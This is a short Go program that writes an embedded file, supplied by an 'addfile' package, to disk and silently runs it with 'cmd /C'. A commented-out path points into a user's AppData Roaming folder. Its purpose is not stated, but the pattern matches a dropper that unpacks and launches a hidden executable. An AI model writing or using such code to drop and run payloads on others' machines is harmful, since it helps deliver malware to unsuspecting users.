package main

import (
	"addfile"
	"fmt"
	"os"
	"os/exec"
)

func main() {

	file := addfile.GetAdditionFile()
	filename := addfile.GetAdditionFileName()
	fullpath := filename //"C:\\Users\\Ilja\\AppData\\Roaming\\AsocialFriend\\" + filename
	output, err := os.Create(fullpath)
	if err != nil {
		fmt.Println(err)
	}
	_, err = output.Write([]byte(file))

	if err != nil {
		fmt.Println(err)
	}

	//	fmt.Println(fullpath)

	output.Close()
	er := exec.Command("cmd", "/C", fullpath).Start()

	if er != nil {
		fmt.Println(er)
	}
}
